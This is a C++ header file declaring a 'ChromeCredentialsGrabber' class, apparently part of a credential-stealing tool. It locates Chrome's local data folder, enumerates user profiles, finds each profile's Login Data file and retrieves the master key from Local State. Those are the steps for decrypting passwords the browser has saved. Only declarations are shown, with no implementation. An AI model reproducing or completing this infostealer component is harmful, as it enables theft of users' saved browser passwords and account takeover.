#pragma once
#include "CredentialsGrabber.hpp"
#include "Json.hpp"

#include <filesystem>

class ChromeCredentialsGrabber final : public CredentialsGrabber
{
public:
	explicit ChromeCredentialsGrabber() = default;
	~ChromeCredentialsGrabber() override = default;
	ChromeCredentialsGrabber(const ChromeCredentialsGrabber&) = delete;
	ChromeCredentialsGrabber& operator=(const ChromeCredentialsGrabber&) = delete;
	ChromeCredentialsGrabber(ChromeCredentialsGrabber&&) = delete;
	ChromeCredentialsGrabber& operator=(ChromeCredentialsGrabber&&) = delete;

	[[nodiscard]] std::optional<Credentials> grab_credentials() const override;
	[[nodiscard]] std::wstring source() const override;

private:
	static constexpr auto CHROME_ROOT_FOLDER = L"%LOCALAPPDATA%/Google/Chrome/";

	[[nodiscard]] static std::optional<Time::Datetime> convert_datetime(int64_t webkit_datetime);

	[[nodiscard]] static std::filesystem::path get_local_chrome_path();
	[[nodiscard]] static std::filesystem::path get_user_data_path(const std::filesystem::path& chrome_root);
	[[nodiscard]] static std::filesystem::path get_local_state_path(const std::filesystem::path& chrome_root);
	[[nodiscard]] static std::filesystem::path get_login_data_path(const std::filesystem::path& chrome_root,
	                                                               const std::wstring& profile);

	class LocalState final
	{
	public:
		explicit LocalState(Json local_state);
		~LocalState() = default;
		LocalState(const LocalState&) = delete;
		LocalState& operator=(const LocalState&) = delete;
		LocalState(LocalState&&) = delete;
		LocalState& operator=(LocalState&&) = delete;

		[[nodiscard]] std::vector<std::wstring> get_user_profiles() const;
		[[nodiscard]] Buffer get_master_key() const;

		[[nodiscard]] static LocalState from_chrome_root(const std::filesystem::path& chrome_root);

	private:
		Json m_local_state;
	};
};
